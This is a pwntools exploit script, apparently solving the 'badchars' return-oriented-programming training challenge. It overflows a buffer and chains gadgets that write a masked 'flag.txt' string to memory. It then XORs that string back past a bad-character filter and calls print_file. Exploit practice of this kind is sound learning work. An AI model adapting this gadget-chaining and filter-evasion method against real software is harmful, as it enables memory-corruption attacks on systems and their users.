from pwn import *

elf = ELF("./badchars")
r = elf.process()
gdb.attach(r, api = True)
payload = b"a" * 40

store_addr = 0x601070
#recover "."
payload += p64(0x000000000040069c) #pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += b"fl___t_t"
payload += p64(store_addr)
payload += p64(0x71) 
payload += p64(store_addr + 4)
payload += p64(0x0000000000400634) # mov    QWORD PTR [r13+0x0],r12
payload += p64(0x0000000000400628) #xor    BYTE PTR [r15],r14b
# recover "x"
payload += p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x27)
payload += p64(store_addr + 6)
payload += p64(0x0000000000400628) #xor    BYTE PTR [r15],r14b
#recover "a"
payload += p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x3e)
payload += p64(store_addr + 2)
payload += p64(0x0000000000400628) #xor    BYTE PTR [r15],r14b
#recover "g"
payload += p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
payload += p64(0x38)
payload += p64(store_addr + 3)
payload += p64(0x0000000000400628) #xor    BYTE PTR [r15],r14b
payload += p64(0x00000000004006a3) # pop rdi ; ret
payload += p64(0x601070)
payload += p64(elf.sym["print_file"])
r.sendline(payload)

r.interactive()